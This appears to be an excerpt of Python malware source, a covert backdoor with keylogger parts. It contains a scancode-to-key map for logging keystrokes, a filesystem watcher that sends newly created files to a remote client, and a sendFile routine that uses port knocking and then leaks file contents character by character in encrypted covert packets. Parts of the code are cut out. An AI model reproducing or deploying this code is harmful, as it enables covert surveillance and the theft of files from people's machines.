...
scancodes = {
    ...
    20: u'T', 21: u'Y', 22: u'U', 23: u'I', 24: u'O', 25: u'P', 26: u'[', 27: u']', 28: u'[ENTR]\n', 29: u'[LCTRL]',
...
class EventHandler(pyinotify.ProcessEvent):
	def process_IN_CREATE(self, event):
		...
		if isFile:
			sendFile(event.pathname, client, protocol)
...
--					address - the ip to send the file contents to
--					proto - the protocl to send the file contents with
--
--  RETURNS:  	void
--
...
------------------------------------------------------------------------------*/
"""
def sendFile(target, address, proto):
	recvFunctions.knockCode(address, proto, True)

	send(utils.covertPacket(address, proto, '\n', recvFunctions.pswd), verbose=0)
	try:
		with open(target, 'r') as f:
			while True:
				...
				send(utils.covertPacket(address, proto, c, recvFunctions.pswd), verbose=0)
	except(IOError):
		for c in utils.encryptData("File not found\n"):
			send(utils.covertPacket(address, proto, c, recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(address, proto, False)
